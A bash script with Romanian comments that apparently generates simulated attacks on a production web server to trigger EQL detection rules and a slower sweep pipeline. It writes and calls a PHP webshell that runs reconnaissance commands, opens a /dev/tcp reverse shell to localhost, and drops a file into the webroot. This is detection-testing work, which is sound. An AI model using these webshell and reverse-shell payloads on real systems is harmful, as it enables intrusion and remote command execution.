#!/bin/bash
# Set de atacuri care declanseaza AMBELE cai:
#   - reguli EQL -> alerte -> calea rapida
#   - perechi noi (binare nefolosite pana acum) -> sweep -> calea lenta
# Se ruleaza pe web-prod. Toate atacurile sunt catre localhost, inofensive.
set -u
echo "=== Generez atacuri $(date +%H:%M:%S) ==="

wsh() {  # webshell one-shot: creeaza, apeleaza, sterge
  printf '%s' '<?php system($_GET["c"]); ?>' | sudo tee /var/www/html/x.php >/dev/null
  curl -s "http://localhost/x.php?c=$1" >/dev/null
  sudo rm -f /var/www/html/x.php
}

echo "[calea rapida] RCE prin webshell (apache2 -> shell -> id)"
wsh "id"

echo "[calea rapida] reverse shell /dev/tcp"
timeout 2 bash -c 'bash -i >& /dev/tcp/127.0.0.1/9999 0>&1' 2>/dev/null

echo "[calea rapida] executabil scris in webroot"
printf '%s' '<?php echo 1; ?>' | sudo tee /var/www/html/dropped.php >/dev/null
sudo rm -f /var/www/html/dropped.php

echo "[calea lenta] perechi NOI de recunoastere prin webshell"
# binare de recon rar folosite -> apache2 -> dash -> <binar nou>
for c in "hostname" "uptime" "lscpu" "getent+passwd" "arch"; do
  wsh "$c"
  sleep 1
done

echo "[calea lenta] enumerare de retea prin webshell (binare noi)"
for c in "ss+-tuln" "ip+addr"; do
  wsh "$c"
  sleep 1
done

echo "=== Gata. Asteapta ~6 min ca regulile EQL sa se declanseze, apoi ruleaza orchestratorul. ==="
